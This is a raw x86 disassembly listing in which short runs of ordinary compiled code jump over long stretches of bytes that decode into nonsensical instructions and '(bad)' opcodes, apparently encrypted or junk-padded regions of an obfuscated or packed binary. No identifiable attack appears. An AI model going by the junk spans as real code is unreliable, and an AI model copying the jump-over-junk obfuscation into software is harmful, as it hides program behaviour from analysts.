  411cb8:	mov    DWORD PTR [ebp-0x4],edx
  411cbb:	mov    eax,DWORD PTR [ebp-0x4]
  411cbe:	mov    edx,DWORD PTR [ebp-0x4]
  411cc1:	mov    dl,BYTE PTR [edx+esi*1]
  411cc4:	mov    esi,DWORD PTR [ebp+0x8]
  411cc7:	mov    BYTE PTR [eax+esi*1],dl
  411cca:	mov    eax,DWORD PTR [ebp-0x10]
  411ccd:	mov    edx,DWORD PTR [ebp-0x14]
  411cd0:	jmp    0x411fd9
  411cd5:	xchg   esi,eax
  411cd6:	mov    dh,0x33
  411cd8:	push   edx
  411cd9:	xor    ebx,DWORD PTR [eax+edi*4-0x46]
  411cdd:	push   eax
  411cde:	ret    0x923c
  411ce1:	lods   eax,DWORD PTR ds:[esi]
  411ce2:	jno    0x411d1c
  411ce4:	xchg   edx,eax
  411ce5:	mov    WORD PTR [eax-0x42],fs
  411ce8:	mov    esi,0xbebec28e
  411ced:	push   edi
  411cee:	stos   BYTE PTR es:[edi],al
  411cef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411cf0:	fsubr  QWORD PTR [ebx-0x49e634ab]
  411cf6:	cmp    cl,BYTE PTR [ebx-0x7e]
  411cf9:	out    dx,al
  411cfa:	cmp    al,BYTE PTR [ebx]
  411cfc:	xor    eax,0x8ea33588
  411d01:	out    dx,eax
  411d02:	dec    ecx
  411d03:	jbe    0x411c8e
  411d05:	xchg   ebp,eax
  411d06:	ins    DWORD PTR es:[edi],dx
  411d07:	xchg   ebp,eax
  411d08:	cwde   
  411d09:	pop    edi
  411d0a:	sub    DWORD PTR [ebp*8+0x506af6b6],esi
  411d11:	sub    eax,0xd1f25b37
  411d16:	mov    ebx,0x9422dc7d
  411d1b:	jecxz  0x411cfa
  411d1d:	jo     0x411d5b
  411d1f:	jae    0x411d6d
  411d21:	pop    ecx
  411d22:	dec    ebp
  411d23:	lds    sp,DWORD PTR [esi]
  411d26:	popf   
  411d27:	test   DWORD PTR [ebx+esi*8],edx
  411d2a:	cs jbe 0x411d91
  411d2d:	icebp  
  411d2e:	sub    edx,DWORD PTR [esi-0x73]
  411d31:	mov    al,ds:0xf9fcf790
  411d36:	mov    WORD PTR [ebx],ds
  411d38:	dec    ecx
  411d39:	adc    al,0x54
  411d3b:	arpl   WORD PTR [ecx+0x2d],sp
  411d3e:	inc    ebp
  411d3f:	adc    eax,0x1d68e1c4
  411d44:	not    edi
  411d46:	popa   
  411d47:	mov    esp,0xc3a5285f
  411d4c:	or     al,0x4d
  411d4e:	jb     0x411d9b
  411d50:	mov    esp,0xb2b89781
  411d55:	test   al,0x63
  411d57:	xchg   WORD PTR [esi],dx
  411d5a:	stc    
  411d5b:	add    DWORD PTR [edi-0x793527c4],edi
  411d61:	push   ebx
  411d62:	sbb    al,0xa7
  411d64:	push   cs
  411d65:	dec    eax
  411d66:	jmp    0x411cfc
  411d68:	xchg   DWORD PTR [ecx-0x72],edx
  411d6b:	scas   al,BYTE PTR es:[edi]
  411d6c:	repz sbb al,0x4b
  411d6f:	or     ebp,DWORD PTR [edi+0x7f8a6d7e]
  411d75:	or     BYTE PTR [ebp-0x73],cl
  411d78:	inc    esi
  411d79:	sbb    BYTE PTR [edx],dl
  411d7b:	je     0x411d50
  411d7d:	cs inc eax
  411d7f:	inc    edi
  411d80:	addr16 in al,dx
  411d82:	cmp    edx,DWORD PTR [edi+0x2e]
  411d85:	mov    BYTE PTR [esi],ch
  411d87:	repz mov esp,0xac8cf15d
  411d8d:	sar    edi,0x3b
  411d90:	dec    ecx
  411d91:	lods   al,BYTE PTR ds:[esi]
  411d92:	cmp    DWORD PTR [esp+ebx*4-0x7],ebx
  411d96:	sub    ch,cl
  411d98:	lds    esp,FWORD PTR [edi-0x26]
  411d9b:	and    ebx,0xe74fe6d0
  411da1:	arpl   sp,bp
  411da3:	mov    esp,0x415f2e17
  411da8:	add    al,0x89
  411daa:	xchg   esp,eax
  411dab:	cmp    esi,DWORD PTR [edx+0x32]
  411dae:	jns    0x411e2f
  411db0:	dec    ebp
  411db1:	adc    BYTE PTR [esi+0xc],bl
  411db4:	lods   al,BYTE PTR ds:[esi]
  411db5:	(bad)  
  411db6:	retf   
  411db7:	cli    
  411db8:	mov    edi,0x9c233809
  411dbd:	add    cl,BYTE PTR [edi-0x5df296d6]
  411dc3:	call   0xa2c5d2e3
  411dc8:	mov    edx,eax
  411dca:	mov    cl,0x22
  411dcc:	mov    bl,0x29
  411dce:	sbb    edi,DWORD PTR [eax]
  411dd0:	loop   0x411e48
  411dd2:	xor    al,0xb7
  411dd4:	mov    BYTE PTR [edx-0x22],ah
  411dd7:	nop
  411dd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411dd9:	jmp    0x5ee2b6c3
  411dde:	add    bh,BYTE PTR [esi-0x67fe1850]
  411de4:	fcom   DWORD PTR [esp+ebx*2]
  411de7:	pop    ss
  411de8:	pushf  
  411de9:	sub    DWORD PTR [ecx+0x6c],esi
  411dec:	mov    ds:0x9c04440f,eax
  411df2:	ror    DWORD PTR [esi+0x22],cl
  411df5:	leave  
  411df6:	mov    bh,0x44
  411df8:	retf   0x6607
  411dfb:	mov    esp,0x9f0b39e
  411e00:	mov    WORD PTR [edx],ss
  411e02:	sub    eax,ebx
  411e04:	push   ds
  411e05:	or     DWORD PTR [ecx-0x80],eax
  411e08:	dec    esp
  411e09:	lods   eax,DWORD PTR ds:[esi]
  411e0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e0b:	in     al,dx
  411e0c:	mov    DWORD PTR [ebx],eax
  411e0e:	push   eax
  411e0f:	pushf  
  411e10:	mov    ds:0x470e4616,eax
  411e15:	xor    eax,0xfdce13ee
  411e1a:	and    eax,0x3e00823a
  411e1f:	hlt    
  411e20:	inc    eax
  411e21:	and    BYTE PTR [edi+0x64bf2ef1],ah
  411e27:	add    al,0xfa
  411e29:	and    edi,eax
  411e2b:	or     cl,0x81
  411e2e:	xchg   edi,eax
  411e2f:	(bad)
  411e32:	add    dh,BYTE PTR [ebx]
  411e34:	gs adc al,0xbf
  411e37:	xor    dl,BYTE PTR [esi]
  411e39:	mov    ah,0xb1
  411e3b:	xor    bl,cl
  411e3d:	call   0xaebedebe
  411e42:	(bad)  
  411e43:	cmc    
  411e44:	sbb    DWORD PTR [esi],ecx
  411e46:	retf   
  411e47:	les    esi,FWORD PTR [eax-0x2bc76dcf]
  411e4d:	pusha  
  411e4e:	mov    ebp,0x673c146a
  411e53:	sbb    eax,0xcf0f1acc
  411e58:	(bad)  
  411e59:	jecxz  0x411ea8
  411e5b:	inc    ecx
  411e5c:	lods   eax,DWORD PTR ds:[esi]
  411e5d:	and    eax,0x7cf38aec
  411e62:	mov    bl,0x8c
  411e64:	lahf   
  411e65:	inc    edi
  411e66:	pushf  
  411e67:	fxch   st(1)
  411e69:	or     al,0x2
  411e6b:	xchg   ebx,eax
  411e6c:	add    al,0x6f
  411e6e:	sbb    ebp,DWORD PTR [eax-0x7e]
  411e71:	pop    ds
  411e72:	addr16 jp 0x411e36
  411e75:	hlt    
  411e76:	lds    edi,FWORD PTR [ebx]
  411e78:	xor    al,bh
  411e7a:	scas   eax,DWORD PTR es:[edi]
  411e7b:	jecxz  0x411e96
  411e7d:	inc    esp
  411e7e:	or     al,0x88
  411e80:	in     eax,0x33
  411e82:	dec    esp
  411e83:	aaa    
  411e84:	add    ebx,DWORD PTR [ecx-0x44]
  411e87:	or     cl,ah
  411e89:	popa   
  411e8a:	ficom  DWORD PTR [bp+si+0x29]
  411e8e:	scas   al,BYTE PTR es:[edi]
  411e8f:	stc    
  411e90:	sub    BYTE PTR [ebx-0x1ff80376],dh
  411e96:	xor    ebx,0x6e
  411e99:	add    bl,dl
  411e9b:	add    DWORD PTR [eax],0xdebe2a47
  411ea1:	stos   BYTE PTR es:[edi],al
  411ea2:	scas   eax,DWORD PTR es:[edi]
  411ea3:	gs lahf 
  411ea5:	imul   ebp,DWORD PTR [edi+eiz*2-0x1a49f55],0xffffffb4
  411ead:	dec    ebx
  411eae:	ss or  al,0xd7
  411eb1:	mov    ch,0xfc
  411eb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411eb4:	dec    edx
  411eb5:	sub    eax,0x35d2aa75
  411eba:	sahf   
  411ebb:	jmp    0x64746d8a
  411ec0:	retf   0x1c7a
  411ec3:	jmp    0x6f90e5cc
  411ec8:	pop    es
  411ec9:	scas   eax,DWORD PTR es:[edi]
  411eca:	out    0x58,al
  411ecc:	pop    ebp
  411ecd:	lods   al,BYTE PTR ds:[esi]
  411ece:	jl     0x411eff
  411ed0:	pop    esi
  411ed1:	push   ss
  411ed2:	sbb    eax,0xa30839e7
  411ed7:	or     eax,0xa8d9ccfd
  411edc:	inc    ebx
  411edd:	push   0x21
  411edf:	add    esi,DWORD PTR [ebx+0x73]
  411ee2:	xchg   ebp,eax
  411ee3:	lahf   
  411ee4:	and    al,0xc1
  411ee6:	fwait
  411ee7:	lea    esi,[edi+0x13]
  411eea:	jne    0x411f28
  411eec:	sub    eax,0xf5531d46
  411ef1:	xchg   eax,ebp
  411ef3:	add    al,0x9e
  411ef5:	inc    esp
  411ef6:	adc    eax,0xfcbb015f
  411efb:	jmp    0x411f48
  411efd:	mov    bl,0xef
  411eff:	cmc    
  411f00:	xor    eax,0xf4a23a02
  411f05:	fisubr DWORD PTR ss:[eax-0xf7de1dc]
  411f0c:	pusha  
  411f0d:	jp     0x411f32
  411f0f:	clc    
  411f10:	push   ecx
  411f11:	gs sub eax,0x763ac5dc
  411f18:	mov    eax,0xd58fecf4
  411f1d:	icebp  
  411f1e:	nop
  411f1f:	inc    esp
  411f20:	(bad)  
  411f21:	mov    dl,0xaa
  411f23:	push   ebp
  411f24:	clc    
  411f25:	or     BYTE PTR [esi],dl
  411f27:	ja     0x411f5f
  411f29:	adc    al,0xce
  411f2b:	jmp    FWORD PTR [esi+0x14]
  411f2e:	mov    eax,DWORD PTR [eax-0x64a3ebc3]
  411f34:	(bad)  
  411f35:	jne    0x411f69
  411f37:	lods   eax,DWORD PTR ds:[esi]
  411f38:	sbb    DWORD PTR [eax+ecx*2],ebx
  411f3b:	jns    0x411f32
  411f3d:	push   cs
  411f3e:	xor    edi,DWORD PTR [edx-0x57e4cfe1]
  411f44:	cmp    DWORD PTR [ebx],esi
  411f46:	mov    bl,0xd
  411f48:	cld    
  411f49:	hlt    
  411f4a:	js     0x411efc
  411f4c:	inc    ebx
  411f4d:	repz mov fs,WORD PTR [ebx-0x5a]
  411f51:	popf   
  411f52:	pop    esp
  411f53:	push   edi
  411f54:	aam    0xe
  411f56:	jecxz  0x411efa
  411f58:	nop
  411f59:	cli    
  411f5a:	or     BYTE PTR ds:0x4cbc0619,dl
  411f60:	call   0x1dc1:0xe1bff527
  411f67:	scas   eax,DWORD PTR es:[edi]
  411f68:	rcl    BYTE PTR [edi],0x52
  411f6b:	inc    edx
  411f6c:	pusha  
  411f6d:	loopne 0x411f97
  411f6f:	cdq    
  411f70:	les    eax,FWORD PTR [edi]
  411f72:	test   eax,0xb30f565e
  411f77:	(bad)  
  411f78:	das    
  411f79:	bound  edi,QWORD PTR [edx+0x2]
  411f7c:	emms   
  411f7e:	mov    bh,0x57
  411f80:	sbb    ebp,DWORD PTR [ebx+0x3d]
  411f83:	cmp    BYTE PTR [edx+0x41],bl
  411f86:	inc    edx
  411f87:	or     DWORD PTR [eax],ebp
  411f89:	in     al,dx
  411f8a:	sti    
  411f8b:	xor    BYTE PTR [eax+0x532de17d],0xcd
  411f92:	sbb    al,0x43
  411f94:	pop    esi
  411f95:	arpl   WORD PTR [esi+0x2c4ca947],sp
  411f9b:	and    al,0xd9
  411f9d:	adc    DWORD PTR [ebx-0x5755004],ebp
  411fa3:	lock in eax,0xf5
  411fa6:	ror    BYTE PTR [edx+0x51],0x39
  411faa:	jg     0x411f68
  411fac:	fld    QWORD PTR [esi+0xe119018]
  411fb2:	cmp    DWORD PTR [ebp-0x43],0xeb0e6081
  411fb9:	mov    ebp,0x45c49ee
  411fbe:	jecxz  0x411f93
  411fc0:	jmp    0xc9233092
  411fc5:	mov    eax,0x41d0213e
  411fca:	jg     0xf1485e18
  411fd0:	aaa    
  411fd1:	fimul  DWORD PTR [eax]
  411fd3:	aas    
  411fd4:	mov    ah,0x77
  411fd6:	pop    es
  411fd7:	das    
  411fd8:	js     0x412043
  411fda:	rcl    BYTE PTR [eax+0x23043bd2],0xc2
  411fe1:	or     eax,0x1a40
  411fe6:	xor    eax,0x1ac1
  411feb:	add    ecx,eax
  411fed:	mov    eax,DWORD PTR [ebp-0x18]
  411ff0:	mov    edx,0x7380
  411ff5:	sub    edx,eax
  411ff7:	add    edx,DWORD PTR [ebp-0x1c]
  411ffa:	mov    eax,DWORD PTR [ebp-0x20]
  411ffd:	xor    edx,eax
  411fff:	mov    eax,DWORD PTR [ebp-0x24]
  412002:	and    edx,eax
  412004:	mov    eax,DWORD PTR [ebp+0x10]
  412007:	jmp    0x412310
  41200c:	icebp  
  41200d:	or     DWORD PTR [ebp+0x7c3cad28],0xcf30669c
  412017:	nop
  412018:	iret   
  412019:	sar    BYTE PTR [eax],cl
  41201b:	xchg   edx,eax
  41201c:	pop    esp
  41201d:	mov    si,0x8ebe
  412021:	ret    0xbebe
  412024:	iret   
  412025:	sub    BYTE PTR [edx+0x34f33adc],ah
  41202b:	mov    ebx,0x39756e47
  412030:	out    0x56,eax
  412032:	call   0xebc5:0x2cdbdb1c
  412039:	sbb    edi,DWORD PTR [eax+0x34]
  41203c:	xchg   ebp,eax
  41203d:	dec    esp
  41203e:	call   0x3246:0xbb0a3d81
  412045:	mov    eax,0x98ef2d2b
  41204a:	mov    al,0x21
  41204c:	push   ebp
  41204d:	jge    0x4120ad
  41204f:	cdq    
  412050:	add    DWORD PTR [edi-0x10],0xffffffe4
  412054:	aam    0x38
  412056:	jo     0x412000
  412058:	push   ds
  412059:	(bad)  
  41205b:	mov    WORD PTR [esi+edi*2-0x37],?
  41205f:	rcr    BYTE PTR [esi+0x68dbec30],0xaa
  412066:	and    al,0xad
  412068:	neg    DWORD PTR [edi+0x31]
  41206b:	in     eax,0xb2
  41206d:	pop    ecx
  41206e:	mov    dl,0x61
  412070:	adc    edx,DWORD PTR [ecx]
  412072:	jns    0x412003
  412074:	push   esi
  412075:	into   
  412076:	sbb    al,0xb2
  412078:	jp     0x4120b0
  41207a:	loopne 0x41206f
  41207c:	mov    edi,0xa8978fe9
  412081:	sahf   
  412082:	xor    eax,0xe470ead5
  412087:	or     al,0x57
  412089:	jecxz  0x41203e
  41208b:	push   edi
  41208c:	xchg   edi,eax
  41208d:	cmp    eax,0x48fcd03c
  412092:	pop    eax
  412093:	int3   
  412094:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  412096:	enter  0xdd21,0x99
  41209a:	and    edi,DWORD PTR [edi]
  41209c:	imul   edi,DWORD PTR [edi+0x42],0x530241b2
  4120a3:	retf   
  4120a4:	pushf  
  4120a5:	jmp    0x7976d0f7
  4120aa:	jnp    0x41209a
  4120ac:	das    
  4120ad:	push   esp
  4120ae:	xchg   edi,eax
  4120af:	es out dx,eax
  4120b1:	pop    edx
  4120b2:	stos   BYTE PTR es:[edi],al
  4120b3:	jp     0x412050
  4120b5:	jle    0x41209a
  4120b7:	push   ds
  4120b8:	jno    0x412064
  4120ba:	jecxz  0x4120af
  4120bc:	(bad)  
  4120bd:	dec    edx
  4120be:	test   bl,ah
  4120c0:	sbb    DWORD PTR [esi+0x1e],edi
  4120c3:	jbe    0x4120ef
  4120c5:	jecxz  0x4120e7
  4120c7:	and    eax,0xa40e739d
  4120cc:	and    eax,0x34cb0118
  4120d1:	inc    eax
  4120d2:	retf   0x680e
  4120d5:	cmc    
  4120d6:	out    0xc0,eax
  4120d8:	pop    esp
  4120d9:	clc    
  4120da:	lods   eax,DWORD PTR ds:[esi]
  4120db:	data16 jg 0x412075
  4120de:	sbb    DWORD PTR [esi+0x25],esp
  4120e1:	fistp  WORD PTR [eax+0x4b]
  4120e4:	xchg   ebp,eax
  4120e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120e6:	mov    esi,0xafe37ed0
  4120eb:	xchg   esi,eax
  4120ec:	mov    ebx,0xa0bebf49
  4120f1:	ret    
  4120f2:	jl     0x412077
  4120f4:	es jg  0x4120fc
  4120f7:	pop    esi
  4120f8:	or     ebp,ebx
  4120fa:	ret    
  4120fb:	add    ch,BYTE PTR [edi+0xa6463f0]
  412101:	sar    DWORD PTR [edx+ebx*2+0xfa7926f],1
  412108:	paddusw mm5,QWORD PTR [edx]
  41210b:	imul   eax,DWORD PTR [ebp-0x1d22153c],0x8b17b739
  412115:	xchg   esi,eax
  412116:	or     ch,BYTE PTR [ebx]
  412118:	retf   
  412119:	inc    edi
  41211a:	dec    ebp
  41211b:	lods   eax,DWORD PTR ds:[esi]
  41211c:	loop   0x412189
  41211e:	xor    BYTE PTR [ebx],0xb
  412121:	repz sti 
  412123:	scas   al,BYTE PTR es:[edi]
  412124:	mov    esp,0xb30696cd
  412129:	test   BYTE PTR [eax+0x50],dl
  41212c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41212d:	in     al,0x21
  41212f:	gs push ebx
  412131:	fucom  st(2)
  412133:	push   es
  412134:	movhps QWORD PTR [ecx-0x21],xmm7
  412138:	adc    al,0xb5
  41213a:	sub    DWORD PTR [esi-0x1f2ca570],edi
  412140:	sbb    DWORD PTR [ebx-0x68],ebx
  412143:	shl    DWORD PTR [edx-0x41],cl
  412146:	and    BYTE PTR [esi+eax*2],al
  412149:	lds    edi,FWORD PTR [eax+0x58]
  41214c:	pop    esi
  41214d:	movlps QWORD PTR [edx+0x3ff00b95],xmm5
  412154:	mov    al,0x58
  412156:	aas    
  412157:	mov    ebx,0x644526a1
  41215c:	out    0x8e,eax
  41215e:	mov    eax,ds:0xb3e09213
  412163:	xor    BYTE PTR [ebp+0x3d],ah
  412166:	fwait
  412167:	arpl   WORD PTR [eax-0x7a],bp
  41216a:	inc    ecx
  41216b:	push   esi
  41216c:	std    
  41216d:	mov    ds:0x5032046d,eax
  412172:	(bad)  
  412173:	cmovne ebp,eax
  412176:	jg     0x4121f3
  412178:	fsubp  st(3),st
  41217a:	jg     0x4121d5
  41217c:	iret   
  41217d:	loope  0x412184
  41217f:	push   esi
  412180:	push   eax
  412181:	mov    ecx,0x89144d9a
  412186:	mov    dh,0xfd
  412188:	push   esi
  412189:	sahf   
  41218a:	lahf   
  41218b:	jl     0x4121e3
  41218d:	out    0x91,al
  41218f:	stc    
  412190:	adc    edi,DWORD PTR [eax-0xdfebe45]
  412196:	(bad)  
  412197:	xacquire xchg DWORD PTR [edi+ebx*8-0x1e],ebx
  41219c:	inc    ebp
  41219d:	and    al,0xe0
  41219f:	cmp    al,0xd1
  4121a1:	add    eax,0x89ebd2bc
  4121a6:	xchg   edi,eax
  4121a7:	xchg   esi,eax
  4121a8:	enter  0xbe78,0x23
  4121ac:	leave  
  4121ad:	jmp    0x95ce80f8
  4121b2:	test   DWORD PTR [ecx+0x576471da],esi
  4121b8:	or     al,0xe2
  4121ba:	mov    DWORD PTR [eax+0x700d87b3],edx
  4121c0:	jmp    0x3207cd08
  4121c5:	jmp    0xe491:0xa0181a9f
  4121cc:	push   0x28
  4121ce:	jb     0x4121d5
  4121d0:	lahf   
  4121d1:	jae    0x412196
  4121d3:	mov    ch,0x1a
  4121d5:	add    ebp,ebp
  4121d7:	pop    esp
  4121d8:	jb     0x41221c
  4121da:	enter  0xb976,0x1f
  4121de:	out    dx,eax
  4121df:	jnp    0x412163
  4121e1:	stos   DWORD PTR es:[edi],eax
  4121e2:	aam    0xff
  4121e4:	sbb    eax,0x4b3391bd
  4121e9:	call   ecx
  4121eb:	jae    0x412218
  4121ed:	push   esp
  4121ee:	jnp    0x412190
  4121f0:	jp     0x4121f7
  4121f2:	lods   al,BYTE PTR ds:[esi]
  4121f3:	lods   eax,DWORD PTR ds:[esi]
  4121f4:	pop    eax
  4121f5:	dec    edx
  4121f6:	jmp    0x544c:0xf09b0dc3
  4121fd:	add    al,0x21
  4121ff:	mov    edx,0x96899cac
  412204:	pushf  
  412205:	mov    edx,0x9fa5607
  41220a:	cs push edx
  41220c:	mov    ch,0x35
  41220e:	adc    bl,bl
  412210:	mov    cl,0xff
  412212:	nop
  412213:	inc    esi
  412214:	sbb    ebx,eax
  412216:	push   0x8221cc5
  41221b:	scas   al,BYTE PTR es:[edi]
  41221c:	sbb    eax,0x60713828
  412221:	outs   dx,BYTE PTR ds:[esi]
  412222:	jl     0x4121f0
  412224:	pop    esi
  412225:	push   ds
  412226:	mov    bl,0x25
  412228:	repz dec eax
  41222a:	fnstsw WORD PTR ds:0xcf5fb415
  412230:	xchg   BYTE PTR [ebx-0x4f98e189],ah
  412236:	xlat   BYTE PTR ds:[ebx]
  412237:	xor    BYTE PTR [edi-0x6765011c],bl
  41223d:	fidivr DWORD PTR [ecx+0x7b]
  412240:	lea    edx,fs:[esp+eax*8+0x5a20f108]
  412248:	jl     0x41222a
  41224a:	xchg   DWORD PTR [ecx+0x5a662f7f],esi
  412250:	push   edx
  412251:	xchg   DWORD PTR [edi-0x5cc32ac6],edi
  412257:	sub    esi,esi
  412259:	mov    al,ds:0x56038086
  41225e:	inc    bx
  412260:	and    al,bl
  412262:	mov    dh,0x12
  412264:	in     eax,0x51
  412266:	mov    al,0x3e
  412268:	push   esp
  412269:	sbb    al,0x90
  41226b:	sub    esp,DWORD PTR ds:0xf0233d6
  412271:	mov    ebx,0xe71bf342
  412276:	in     eax,0x96
  412278:	pop    ecx
  412279:	mov    eax,0xdb67e95b
  41227e:	rcr    BYTE PTR [edx],cl
  412280:	in     al,0xaa
  412282:	mov    bh,0x29
  412284:	dec    ebx
  412285:	ds in  eax,dx
  412287:	int    0x38
  412289:	cdq    
  41228a:	jb     0x4122ba
  41228c:	into   
  41228d:	fdivr  DWORD PTR [ebp+0x2bbf0aeb]
  412293:	or     eax,0xc273440f
  412298:	shl    BYTE PTR [esp+edx*4-0x6d],cl
  41229c:	pop    ecx
  41229d:	jo     0x4122b3
  41229f:	sub    ch,BYTE PTR [edi-0x59998071]
  4122a5:	fld    TBYTE PTR [edx+edi*8]
  4122a8:	por    mm6,QWORD PTR [eax]
  4122ab:	mov    ecx,0xbeeb15dc
  4122b0:	sbb    DWORD PTR [edx-0x1],edx
  4122b3:	test   eax,0x5fad0209
  4122b8:	and    DWORD PTR [eax],0xffffffb4
  4122bb:	lahf   
  4122bc:	mov    BYTE PTR [ebp-0x694b6c85],dh
  4122c2:	(bad)  
  4122c3:	call   0x88830644
  4122c8:	cmp    ecx,eax
  4122ca:	lock (bad) 
  4122cc:	push   esp
  4122cd:	xchg   ecx,eax
  4122ce:	xor    esp,esp
  4122d0:	adc    BYTE PTR ds:0xfabeeb92,al
  4122d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122d7:	call   0xc77b:0xa4354c26
  4122de:	paddb  mm3,mm1
  4122e1:	fld    DWORD PTR [edx]
  4122e3:	movsx  eax,BYTE PTR [esi]
  4122e6:	xchg   esi,ecx
  4122e8:	dec    ecx
  4122e9:	dec    edx
  4122ea:	fnsave [ebx]
  4122ec:	and    BYTE PTR [edi-0x28],ch
  4122ef:	sub    DWORD PTR [edx],0x56d26164
  4122f5:	mov    esi,edx
  4122f7:	xor    dl,dh
  4122f9:	fidivr WORD PTR [edi+0xea0d3c6]
  4122ff:	xor    al,BYTE PTR [ecx]
  412301:	jno    0x4122a9
  412303:	sbb    DWORD PTR [eax-0x77a3057],eax
  412309:	scas   eax,DWORD PTR es:[edi]
  41230a:	xor    al,0x7e
  41230c:	icebp  
  41230d:	frstor cs:[ebp+0x7015f281]
  412314:	add    BYTE PTR [eax],al
  412316:	sub    eax,edx
  412318:	mov    edx,DWORD PTR [ebp-0x28]
  41231b:	mov    esi,DWORD PTR [ebp-0x2c]
  41231e:	and    edx,0x2a7b
  412324:	lea    edx,[edx+esi*1-0x3571]
  41232b:	mov    esi,DWORD PTR [ebp-0x30]
  41232e:	shr    edx,1
  412330:	or     edx,esi
  412332:	mov    esi,ecx
  412334:	sub    esi,edx
  412336:	add    esi,0x4751
  41233c:	cmp    esi,eax
  41233e:	jbe    0x411c83
  412344:	pop    esi
  412345:	leave  
  412346:	ret    0xc
  412349:	push   ebp
  41234a:	mov    ebp,esp
  41234c:	sub    esp,0x80
  412352:	push   ebx
  412353:	jmp    0x41268c
  412358:	push   0xffffffd2
  41235a:	jnp    0x4122dc
  41235c:	jl     0x412306
  41235e:	mov    edx,0xa0fab73b
  412363:	nop
  412364:	mov    ecx,0x2c9e20fd
  412369:	ins    BYTE PTR es:[edi],dx
  41236a:	mov    esi,0xbec4edbe
  41236f:	mov    esi,0x8b42f967
  412374:	aam    0xa6
  412376:	dec    eax
  412377:	and    al,0x72
  412379:	into   
  41237a:	rol    BYTE PTR [edi],cl
  41237c:	xchg   edi,eax
  41237d:	cwde   
  41237e:	jl     0x4123e2
  412380:	mov    edi,0x14de561
  412385:	mov    ebx,0x48aa9434
  41238a:	out    0xb8,eax
  41238c:	xor    al,0x1e
  41238e:	mov    edi,0x1d835346
  412393:	xchg   ebp,eax
  412394:	mov    edi,edx
  412396:	repnz (bad) 
  412398:	iret   
  412399:	mov    bl,0x44
  41239b:	imul   edi,DWORD PTR [edi],0x8bd911f3
  4123a1:	es stc 
  4123a3:	pop    esi
  4123a4:	js     0x412381
  4123a6:	fs xchg ecx,eax
  4123a8:	ja     0x412413
  4123aa:	repnz mov dl,0x86
  4123ad:	adc    eax,0xe6389559
  4123b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123b3:	cdq    
  4123b4:	shl    DWORD PTR [edx],cl
  4123b6:	jbe    0x412395
  4123b8:	or     BYTE PTR [edx+0x10],dl
  4123bb:	ret    
  4123bc:	jmp    0x41242b
  4123be:	xchg   ebp,eax
  4123bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123c0:	mov    dh,BYTE PTR [ebp+0x6d9a98af]
  4123c6:	mov    bh,0x9e
  4123c8:	fs or  al,0x42
  4123cb:	mov    al,ds:0x4f8cc7fb
  4123d0:	sti    
  4123d1:	pusha  
  4123d2:	fwait
  4123d3:	outs   dx,BYTE PTR ds:[esi]
  4123d4:	mov    DWORD PTR [esi+edx*8+0x8937c47],eax
  4123db:	sub    BYTE PTR [edx+0x34],0xfa
  4123df:	ins    BYTE PTR es:[edi],dx
  4123e0:	dec    edi
  4123e1:	ins    DWORD PTR es:[edi],dx
  4123e2:	test   BYTE PTR [edx+0x469bed4c],dl
  4123e8:	aas    
  4123e9:	in     al,dx
  4123ea:	adc    al,0xa1
  4123ec:	mov    esi,0xd72cb32e
  4123f1:	int    0x4b
  4123f3:	es fwait
  4123f5:	jb     0x41241d
  4123f7:	int    0x95
  4123f9:	(bad)  
  4123fa:	aad    0x31
  4123fc:	mov    dh,0x9b
  4123fe:	stc    
  4123ff:	not    DWORD PTR [edx-0x57fdb221]
  412405:	out    0xd,al
  412407:	nop
  412408:	out    0x11,eax
  41240a:	push   cs
  41240b:	and    DWORD PTR [ecx+0x5394d899],0x53ca4859
  412415:	and    eax,0xb37b9803
  41241a:	add    edi,ebp
  41241c:	aas    
  41241d:	aam    0x24
  41241f:	adc    edx,ecx
  412421:	ss inc ebx
  412423:	and    esp,eax
  412425:	xor    eax,0xb05dede4
  41242a:	les    edi,FWORD PTR [edi*2-0xcc92963]
  412431:	lahf   
  412432:	pop    es
  412433:	dec    edi
  412434:	dec    edi
  412435:	mov    cl,0x15
  412437:	(bad)  
  412438:	int3   
  412439:	repz pop esp
  41243b:	fld    QWORD PTR [eax-0x1b4cf721]
  412441:	in     eax,0xb2
  412443:	xchg   esp,eax
  412444:	pushf  
  412445:	push   ecx
  412446:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412447:	inc    edi
  412448:	mov    eax,ds:0xcad71042
  41244d:	mov    dh,0x26
  41244f:	stos   BYTE PTR es:[edi],al
  412450:	xor    eax,0xe7572846
  412455:	jns    0x41248b
  412457:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412458:	lods   eax,DWORD PTR ds:[esi]
  412459:	adc    eax,0x8cc98eb6
  41245e:	cmp    DWORD PTR [esi-0x7c],edx
  412461:	idiv   bl
  412463:	pop    ds
  412464:	enter  0xa14,0xc8
  412468:	and    al,0xd3
  41246a:	ja     0x4124a6
  41246c:	add    al,0xc7
  41246e:	adc    ebp,DWORD PTR [edx]
  412470:	mov    esi,0x71712949
  412475:	jne    0x412406
  412477:	inc    ebp
  412478:	mov    esi,DWORD PTR [ebx]
  41247a:	push   edx
  41247b:	pop    ds
  41247c:	jmp    0xa45d:0xbb04db52
  412483:	inc    edi
  412484:	push   eax
  412485:	xor    al,0x28
  412487:	xor    esp,ecx
  412489:	in     eax,dx
  41248a:	(bad)  
  41248b:	jns    0x41249d
  41248d:	in     eax,dx
  41248e:	lahf   
  41248f:	stc    
  412490:	rol    BYTE PTR [eax],0x13
  412493:	inc    ebx
  412494:	add    al,0x71
  412496:	add    eax,0xbd978892
  41249b:	js     0x412500
  41249d:	mov    cl,0xd
  41249f:	mov    ebx,0xdd36bc1
  4124a4:	popf   
  4124a5:	mov    ch,0x2f
  4124a7:	mov    ds:0x8ba54842,eax
  4124ac:	pop    ebx
  4124ad:	imul   esp,DWORD PTR [edi+0x4d8dc834],0xfd97a591
  4124b7:	xchg   dh,dl
  4124b9:	test   eax,0xbadc9567
  4124be:	(bad)  
  4124bf:	out    dx,eax
